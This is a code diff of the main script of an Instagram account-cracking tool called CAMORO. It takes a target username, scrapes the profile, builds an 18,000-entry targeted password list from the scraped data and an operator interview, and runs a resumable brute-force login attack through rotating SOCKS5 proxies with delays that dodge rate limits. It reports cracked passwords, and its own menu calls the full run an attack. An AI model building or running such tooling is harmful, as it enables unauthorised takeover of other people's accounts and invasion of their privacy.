@@ -1,255 +1,249 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-IGTOOL v3.3 — Only asks for username.
-Proxy auto-fetch + failover fully automatic.
+🐫 CAMORO — Geonode SOCKS5 + AI Edition
+Instagram Security Tool — OSINT · Dictionary · Brute
+10 Elite Proxies · AI Controller · Auto-Healing
 """
-import os, sys
-from core.banner import C, show_banner, clear, info, ok, warn, err, step, ask, yesno, menu
+import os
+import sys
+import traceback
+
+# Add project root to path
+ROOT = os.path.dirname(os.path.abspath(__file__))
+sys.path.insert(0, ROOT)
+
+from core.banner import (
+    clear, show_banner, info, ok, warn, err, ai, C,
+    step, ask, yesno, menu,
+)
+from core.session import Session
+from core.proxy import ProxyManager
 from core.osint import OSINT
 from core.interviewer import Interviewer
 from core.wordlist import WordlistAI
-from core.brute import BruteEngine
-from core.api import InstagramAPI
-
-OUTPUT_DIR = "output"
-DEFAULT_WL_SIZE = 18000
-DEFAULT_DELAY_MIN = 3.0
-DEFAULT_DELAY_MAX = 5.0
+from core.brute import BruteForce
+from core.ai.controller import AIController
 
 
-def count_lines(path):
-    try:
-        with open(path, "r", encoding="utf-8", errors="ignore") as f:
-            return sum(1 for ln in f if ln.strip())
-    except Exception:
-        return 0
-
-
-def lists_or(*vals):
-    for v in vals:
-        if v is None:
-            continue
-        if isinstance(v, list):
-            return v
-        if v:
-            return v
-    return []
-
-
-def merge_hints(answers, hints, username):
-    answers = dict(answers or {})
-    hints = hints or {}
-    answers["username"] = answers.get("username") or username
-    answers["full_name"] = answers.get("full_name") or hints.get("full_name", "")
-    answers["biography"] = hints.get("biography", answers.get("biography", ""))
-    answers["bio_tokens"] = lists_or(hints.get("bio_tokens"), [])
-    answers["osint_tokens"] = lists_or(hints.get("bio_tokens"), [])
-    answers["osint_years"] = lists_or(hints.get("years"), [])
-    answers["years"] = lists_or(hints.get("years"), [])
-    answers["phones"] = lists_or(hints.get("phones"), answers.get("phones"), [])
-    answers["osint_phones"] = lists_or(hints.get("phones"), [])
-    answers["user_parts"] = lists_or(hints.get("user_parts"), [])
-    answers["stat_numbers"] = lists_or(hints.get("stat_numbers"), [])
-    answers["followers"] = hints.get("followers", 0)
-    answers["following"] = hints.get("following", 0)
-    answers["posts"] = hints.get("posts", 0)
-    answers["category"] = hints.get("category", "")
-    answers["external_url"] = hints.get("external_url", "")
-    return answers
-
-
-def run_osint(username, proxy):
-    sid = os.environ.get("IG_SESSIONID") or None
-    bot = OSINT(username, OUTPUT_DIR, proxy, sessionid=sid)
-    data = bot.scrape()
-    hints = bot.get_hints() if bot.data else {"username": username}
-    hints["username"] = hints.get("username") or username
-    return bot, data, hints
-
-
-def gen_dict(answers, username, count=DEFAULT_WL_SIZE):
-    path = os.path.join(OUTPUT_DIR, username, "wordlist.txt")
-    ai = WordlistAI(answers, target_count=count)
-    info(f"Building targeted dictionary → {count} passwords...")
-    ai.generate()
-    ai.save(path)
-    ok(ai.report())
-    ok(f"Saved → {path}")
-    sample = sorted(ai.passwords)[:10]
-    if sample:
-        print(f"\n{C.W}Sample:{C.E}")
-        for s in sample:
-            print(f"  • {s}")
-    return path, ai.count
-
-
-def wl_path(username):
-    return os.path.join(OUTPUT_DIR, username, "wordlist.txt")
-
+# ═══════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════
 
 def main():
     clear()
     show_banner()
 
-    print(f"{C.W}── Setup ──{C.E}\n")
+    # ── Init AI ──
+    ai_controller = AIController()
 
-    # ═══════════════════════════════════
-    # ONLY 1 QUESTION: username
-    # ═══════════════════════════════════
-    username = ask("Instagram username").strip().lstrip("@")
+    # ── Username ──
+    username = ask("Target Instagram username / يوزر الهدف")
     if not username:
-        err("Username required")
+        err("Username required!")
         sys.exit(1)
 
-    # ═══════════════════════════════════
-    # Auto-fetch proxies — no user input
-    # ═══════════════════════════════════
-    proxy = None
-    proxy_file = None
-    if os.path.isfile("proxies.txt"):
-        proxy_file = "proxies.txt"
-        info("Found proxies.txt (optional rotation)")
+    username = username.strip().lstrip("@")
+    info(f"Target: @{username}")
 
-    os.makedirs(os.path.join(OUTPUT_DIR, username), exist_ok=True)
+    # ── Init Proxy Manager (auto-fetch Geonode) ──
+    ai("Initializing proxy pool (Geonode SOCKS5 API)...")
+    proxy_manager = ProxyManager(
+        auto_fetch=True,
+        pool_size=10,
+        country="",
+        ai_brain=ai_controller,
+    )
 
-    info(f"Target : @{username}")
-    info(f"Output : {OUTPUT_DIR}/{username}/")
-    info(f"Proxy  : AUTO-FETCH (spys.one + 10 mirrors)")
-    print()
+    if proxy_manager.count == 0:
+        warn("No proxies available — will run DIRECT (slower, riskier)")
 
-    info("Checking target...")
-    try:
-        exists = InstagramAPI().profile_exists(username)
-        if exists is True:
-            ok(f"@{username} reachable")
-        elif exists is False:
-            warn(f"@{username} may not exist — you can still continue")
-        else:
-            warn("Could not verify — continue anyway")
-    except Exception:
-        warn("Check skipped — continue")
+    # ── Variables ──
+    output_dir = "output"
+    osint_data = {}
+    answers = {}
+    wordlist_path = ""
+    wordlist = []
 
+    # ── Menu loop ──
     while True:
-        choice = menu(
-            [
-                "OSINT — name, bio, followers, posts, private/public",
-                "DICTIONARY — interview → 18000 passwords",
-                "BRUTE FORCE — live progress + auto proxy failover",
-                "FULL ATTACK — OSINT → Interview → Dict → Brute",
-                "RESUME — continue previous brute",
-                "EXIT",
-            ],
-            f"@ {username}  |  proxy: AUTO-FETCH",
-        )
+        print()
+        menu_items = [
+            "OSINT — Gather profile information",
+            "DICTIONARY — Generate targeted wordlist",
+            "BRUTE FORCE — Start password attack",
+            "FULL ATTACK — OSINT + Interview + Dict + Brute",
+            "RESUME — Continue from saved progress",
+            "PROXY STATUS — View proxy pool",
+            "AI STATUS — View AI brain state",
+            "EXIT",
+        ]
+        choice = menu(menu_items, "CAMORO MENU")
 
+        # ── OSINT ──
         if choice == 1:
-            step(1, 1, "OSINT")
-            _, data, _ = run_osint(username, None)
-            if data:
-                ok(f"Saved → {OUTPUT_DIR}/{username}/osint.json")
-            else:
-                warn("OSINT limited — use DICTIONARY + interview")
-            ask("ENTER")
-            clear()
-            show_banner()
-            continue
+            step(1, 1, "OSINT RECONNAISSANCE")
+            proxy_url = proxy_manager.get_next() if proxy_manager.count > 0 else None
+            osint = OSINT(
+                username=username,
+                output_dir=output_dir,
+                proxy=proxy_url,
+            )
+            osint_data = osint.scrape()
+            if not osint_data:
+                warn("OSINT failed — you can fill Interview manually")
+                osint_data = osint.data or {}
 
-        if choice == 2:
-            step(1, 2, "OSINT (auto, quiet if fails)")
+        # ── DICTIONARY ──
+        elif choice == 2:
+            step(2, 2, "DICTIONARY GENERATION")
+
+            # Load OSINT if available
+            hints = {}
+            if osint_data and osint_data.get("username"):
+                osint_obj = OSINT(username, output_dir)
+                osint_obj.data = osint_data
+                hints = osint_obj.get_hints()
+
+            # Interview
+            interviewer = Interviewer(username, hints=hints, output_dir=output_dir)
+            answers = interviewer.run()
+
+            # Generate wordlist
+            wl = WordlistAI(answers, target_count=18000)
+            wl.generate()
+            wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
+            wl.save(wordlist_path)
+            wordlist = WordlistAI.load(wordlist_path)
+            print()
+            ok(wl.report())
+            ok(f"Saved → {wordlist_path}")
+
+        # ── BRUTE FORCE ──
+        elif choice == 3:
+            if not wordlist:
+                wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
+                if os.path.isfile(wordlist_path):
+                    wordlist = WordlistAI.load(wordlist_path)
+                    info(f"Loaded dictionary: {len(wordlist)} passwords")
+                else:
+                    warn("No dictionary found! Run DICTIONARY first (menu 2)")
+                    continue
+
+            step(3, 4, "BRUTE FORCE ATTACK")
+            if not yesno(f"Start brute force with {len(wordlist)} passwords?", True):
+                info("Cancelled")
+                continue
+
+            brute = BruteForce(
+                username=username,
+                wordlist=wordlist,
+                output_dir=output_dir,
+                proxy_manager=proxy_manager,
+                delays=(3, 5),
+                ai_brain=ai_controller,
+            )
+
             try:
-                _, _, hints = run_osint(username, None)
-            except Exception:
-                hints = {"username": username}
-                warn("OSINT skipped")
-            if not hints:
-                hints = {"username": username}
-            step(2, 2, "INTERVIEW → dictionary")
-            answers = Interviewer(username, hints, OUTPUT_DIR).run()
-            answers = merge_hints(answers, hints, username)
-            gen_dict(answers, username, DEFAULT_WL_SIZE)
-            ask("\nENTER")
-            clear()
-            show_banner()
-            continue
+                result = brute.run()
+                if result:
+                    ok(f"Cracked: @{username} : {result.get('password','?')}")
+                else:
+                    warn("Password not found in current dictionary")
+            except KeyboardInterrupt:
+                print()
+                warn("Interrupted — progress saved")
+                brute.stop()
 
-        if choice == 3:
-            path = wl_path(username)
-            if not os.path.isfile(path) or count_lines(path) == 0:
-                warn("No dictionary yet — building now")
-                try:
-                    _, _, hints = run_osint(username, None)
-                except Exception:
-                    hints = {"username": username}
-                answers = Interviewer(username, hints, OUTPUT_DIR).run()
-                answers = merge_hints(answers, hints, username)
-                path, _ = gen_dict(answers, username, DEFAULT_WL_SIZE)
-            n = count_lines(path)
-            print(f"\n{C.R}  {n} passwords → @{username}{C.E}")
-            if not yesno("Start brute?", default_yes=True):
+        # ── FULL ATTACK ──
+        elif choice == 4:
+            step(1, 4, "OSINT")
+            proxy_url = proxy_manager.get_next() if proxy_manager.count > 0 else None
+            osint = OSINT(username, output_dir, proxy=proxy_url)
+            osint_data = osint.scrape()
+
+            step(2, 4, "DICTIONARY")
+            hints = {}
+            if osint_data:
+                osint_obj = OSINT(username, output_dir)
+                osint_obj.data = osint_data
+                hints = osint_obj.get_hints()
+            interviewer = Interviewer(username, hints=hints, output_dir=output_dir)
+            answers = interviewer.run()
+            wl = WordlistAI(answers, target_count=18000)
+            wl.generate()
+            wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
+            wl.save(wordlist_path)
+            wordlist = WordlistAI.load(wordlist_path)
+            ok(wl.report())
+
+            step(3, 4, "BRUTE FORCE")
+            if not yesno(f"Start attack with {len(wordlist)} passwords?", True):
+                info("Skipping brute force")
                 continue
-            found = BruteEngine(username, path, OUTPUT_DIR, delay_min=DEFAULT_DELAY_MIN,
-                                delay_max=DEFAULT_DELAY_MAX, proxy_file=proxy_file).run()
-            if found:
-                print(f"\n{C.G}{'═' * 42}{C.E}")
-                print(f"{C.G}  PASSWORD FOUND: {found}{C.E}")
-                print(f"{C.G}  Saved: {OUTPUT_DIR}/{username}/found.txt{C.E}")
-                print(f"{C.G}{'═' * 42}{C.E}")
-            ask("\nENTER")
-            clear()
-            show_banner()
-            continue
 
-        if choice == 4:
-            step(1, 3, "OSINT")
+            brute = BruteForce(
+                username=username,
+                wordlist=wordlist,
+                output_dir=output_dir,
+                proxy_manager=proxy_manager,
+                delays=(3, 5),
+                ai_brain=ai_controller,
+            )
             try:
-                _, _, hints = run_osint(username, None)
-            except Exception:
-                hints = {"username": username}
-            step(2, 3, "INTERVIEW + DICTIONARY")
-            answers = Interviewer(username, hints, OUTPUT_DIR).run()
-            answers = merge_hints(answers, hints, username)
-            path, cnt = gen_dict(answers, username, DEFAULT_WL_SIZE)
-            step(3, 3, "BRUTE FORCE")
-            print(f"\n{C.R}  {cnt} passwords → @{username}{C.E}")
-            if not yesno("Start brute?", default_yes=True):
-                warn("Dictionary saved — brute skipped")
-                ask("ENTER")
-                clear()
-                show_banner()
-                continue
-            found = BruteEngine(username, path, OUTPUT_DIR, delay_min=DEFAULT_DELAY_MIN,
-                                delay_max=DEFAULT_DELAY_MAX, proxy_file=proxy_file).run()
-            if found:
-                print(f"\n{C.G}  PASSWORD FOUND: {found}{C.E}")
-            ask("\nENTER")
-            clear()
-            show_banner()
-            continue
+                result = brute.run()
+                if result:
+                    ok(f"Cracked: @{username} : {result.get('password','?')}")
+                else:
+                    warn("Password not found")
+            except KeyboardInterrupt:
+                print()
+                warn("Interrupted — progress saved")
+                brute.stop()
 
-        if choice == 5:
-            prog = os.path.join(OUTPUT_DIR, username, "progress.json")
-            path = wl_path(username)
-            if not os.path.isfile(prog):
-                err("Nothing to resume")
-                ask("ENTER")
+        # ── RESUME ──
+        elif choice == 5:
+            step(5, 5, "RESUME ATTACK")
+            wordlist_path = os.path.join(output_dir, username, "wordlist.txt")
+            if not os.path.isfile(wordlist_path):
+                err("No wordlist found! Run DICTIONARY first")
                 continue
-            if not os.path.isfile(path):
-                err("wordlist.txt missing")
-                ask("ENTER")
-                continue
-            info("Resuming...")
-            found = BruteEngine(username, path, OUTPUT_DIR, delay_min=DEFAULT_DELAY_MIN,
-                                delay_max=DEFAULT_DELAY_MAX, proxy_file=proxy_file, resume=True).run()
-            if found:
-                print(f"\n{C.G}  PASSWORD FOUND: {found}{C.E}")
-            ask("\nENTER")
-            clear()
-            show_banner()
-            continue
+            wordlist = WordlistAI.load(wordlist_path)
+            info(f"Loaded {len(wordlist)} passwords")
 
-        if choice == 6:
-            print(f"\n{C.C}  Bye.{C.E}\n")
+            brute = BruteForce(
+                username=username,
+                wordlist=wordlist,
+                output_dir=output_dir,
+                proxy_manager=proxy_manager,
+                delays=(3, 5),
+                ai_brain=ai_controller,
+            )
+            try:
+                result = brute.run()
+                if result:
+                    ok(f"Cracked: @{username} : {result.get('password','?')}")
+                else:
+                    warn("Password not found")
+            except KeyboardInterrupt:
+                print()
+                warn("Interrupted — progress saved")
+                brute.stop()
+
+        # ── PROXY STATUS ──
+        elif choice == 6:
+            proxy_manager.show_stats()
+
+        # ── AI STATUS ──
+        elif choice == 7:
+            ai_controller.status()
+
+        # ── EXIT ──
+        elif choice == 8:
+            print()
+            info("CAMORO shutting down...")
+            ai_controller.memory.save()
+            ok("Goodbye!")
             sys.exit(0)
 
 
@@ -257,5 +251,10 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{C.Y}[!] stopped{C.E}")
+        print()
+        ok("Goodbye!")
         sys.exit(0)
+    except Exception as e:
+        err(f"Fatal error: {e}")
+        traceback.print_exc()
+        sys.exit(1)
